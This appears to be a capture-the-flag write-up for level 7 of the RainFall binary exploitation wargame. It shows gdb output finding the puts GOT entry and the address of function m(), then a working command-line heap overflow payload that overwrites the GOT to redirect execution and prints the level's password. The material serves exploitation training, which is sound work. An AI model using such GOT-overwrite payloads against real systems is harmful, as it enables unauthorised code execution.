# Level 7

we want to call `m()` to print the password read into the global variable `c`

```shell
level7@RainFall:~$ gdb -q ./level7 
Reading symbols from /home/user/level7/level7...(no debugging symbols found)...done.
(gdb) disas puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
(gdb) p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>
```
0x08049928 value of puts in GOT
0x080484f4 value of m

can't pass argv[2] to gdb, most annoying to get the offset, I assumed 16 but it actually overrides the address of  `b[1]` in the third malloc at a padding of 20

```shell
level7@RainFall:~$ ./level7 $(python -c 'print "a"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')                        

5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1668625280
```
